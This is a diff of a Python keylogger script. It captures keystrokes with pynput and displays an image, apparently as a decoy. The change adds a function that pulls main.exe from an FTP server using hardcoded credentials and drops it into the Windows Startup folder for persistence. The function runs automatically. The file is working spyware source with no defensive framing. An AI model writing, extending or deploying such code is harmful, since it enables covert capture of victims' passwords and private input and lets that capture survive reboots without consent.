@@ -1,5 +1,4 @@
 from pynput import keyboard
-#from pynput.keyboard import Listener
 from PIL import Image
 import time
 import ftplib
@@ -36,8 +35,17 @@ Image.open(os.path.join(base_path, 'urabe.jpg')).show()
 with open(filename, 'a') as f:
     f.write('')
 
-#with Listener(on_press=on_press) as listener:
-#    listener.join()
+def addToAutostart():
+    appdata = os.path.join(os.getenv("APPDATA"), "Microsoft/Windows/Start Menu/Programs/Startup/main.exe")
+    HOSTNAME = "localhost"
+    USERNAME = "Frankom"
+    PASSWORD = "123"
+    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
+    with open(appdata, 'wb') as f:
+        ftp_server.retrbinary(f"RETR main.exe", f.write)
+
+addToAutostart()
+
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
